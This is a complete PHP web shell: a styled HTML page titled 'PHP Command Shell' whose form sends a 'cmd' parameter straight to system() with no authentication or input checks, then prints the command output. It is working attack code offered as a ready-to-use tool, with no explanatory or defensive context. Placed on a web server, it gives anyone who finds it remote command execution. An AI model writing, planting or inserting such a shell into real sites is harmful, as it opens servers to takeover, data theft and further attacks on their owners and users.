<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #282c34;
            color: #61dafb;
            text-align: center;
            padding: 50px;
        }
        form {
            margin-bottom: 20px;
        }
        input[type="text"] {
            padding: 10px;
            width: 300px;
            font-size: 16px;
            border-radius: 5px;
            border: 1px solid #61dafb;
        }
        input[type="submit"] {
            padding: 10px 20px;
            font-size: 16px;
            border: none;
            background-color: #61dafb;
            color: #282c34;
            border-radius: 5px;
            cursor: pointer;
        }
        pre {
            background-color: #1c1e22;
            padding: 20px;
            border-radius: 5px;
            color: #fff;
            text-align: left;
            max-width: 600px;
            margin: 0 auto;
            overflow-x: auto;
        }
    </style>
</head>
<body>

<h1>PHP Command Shell</h1>

<form method="GET">
    <input type="text" name="cmd" placeholder="Enter command" />
    <input type="submit" value="Execute" />
</form>

<pre>
<?php
if(isset($_GET['cmd'])){
    $cmd = ($_GET['cmd']);
    system($cmd);
}
?>
</pre>

</body>
</html>
